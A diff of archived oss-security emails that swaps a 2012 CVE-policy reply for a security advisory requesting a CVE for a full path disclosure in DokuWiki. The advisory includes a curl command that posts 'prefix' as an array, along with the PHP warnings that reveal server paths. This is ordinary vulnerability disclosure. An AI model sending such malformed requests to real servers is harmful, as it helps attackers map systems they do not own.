@@ -1,29 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/03/16/14
-Message-ID: <d5e1dd9b9a1e04e4853aacf0722dcb5c@mail.adsl.funky-badger.org>
-Date: Fri, 16 Mar 2012 15:54:22 +0000
-From: "Adam D. Barratt" <adam@...m-barratt.org.uk>
-To: <oss-security@...ts.openwall.com>
-Cc: Kurt Seifried <kseifried@...hat.com>, Mark Stanislav <mark.stanislav@...il.com>
-Subject: Re: CVE Requests
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/06/24/2
+Message-ID: <CA+5g0SK5TjvY548R0WZsvs7fKL48KCPxvEsbA1-y1V4HiEDQtg@mail.gmail.com>
+Date: Sun, 24 Jun 2012 09:40:13 -0300
+From: Felipe Pena <felipensp@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE request: Full path disclosure in DokuWiki
 Content-Type: text/plain; charset=utf-8
 
-On 16.03.2012 10:26, Andreas Ericsson wrote:
-> Those mails are all exemplary requests for CVE id's, ofcourse, but 
-> the
-> fact that they are all already fixed and released means that 100% of
-> the work is already done. At that point, assigning a CVE id is mostly
-> useless and is done as a "just for the record" thing.
+Full path disclosure in DokuWiki
+========================================
+  DokuWiki is a simple to use Wiki aimed at the documentation needs of a small
+company. It works on plain text files and thus needs no database. It has a
+simple but powerful syntax which makes sure the datafiles remain readable
+outside the Wiki.
 
-Whether you consider it useless or not, those are the CVE assignments 
-that will happen on the list, aiui.
+  The POST input 'prefix' is not checked/casted for proper data type before
+passing to PHP's substr() function, which lead to displays an warning with
+sensitive information on server with PHP error level enabled:
 
-http://oss-security.openwall.org/wiki/mailing-lists/oss-security 
-specifically says: "Public security issues only please. What you say 
-here is public for the world to see - keep that in mind. Embargoed 
-information is best disclosed to vendor-sec" (which should be updated to 
-point at somewhere that actually exists).
+  $PRE   = cleanText(substr($_POST['prefix'], 0, -1));
 
+$ curl -dprefix[]=1 http://localhost/dokuwiki/doku.php 2> /dev/null |
+grep Warning
+<b>Warning</b>:  substr() expects parameter 1 to be string, array given in
+<b>/var/www/dokuwiki/doku.php</b> on line <b>47</b><br />
+<b>Warning</b>:  Cannot modify header information - headers already sent by
+(output started at /var/www/dokuwiki/doku.php:47) in
+<b>/var/www/dokuwiki/inc/actions.php</b> on line <b>180</b><br />
+
+Affected versions:
+========================================
+- Angua (RC1)
+- Rincewind
+- Anteater
+
+References:
+========================================
+http://www.freelists.org/post/dokuwiki/Fwd-DokuWiki-Full-path-disclosure
+
+Credits:
+========================================
+This vulnerability was discovered by Felipe Pena.
+Twitter: @felipensp
+
+-- 
 Regards,
-
-Adam
+Felipe Pena
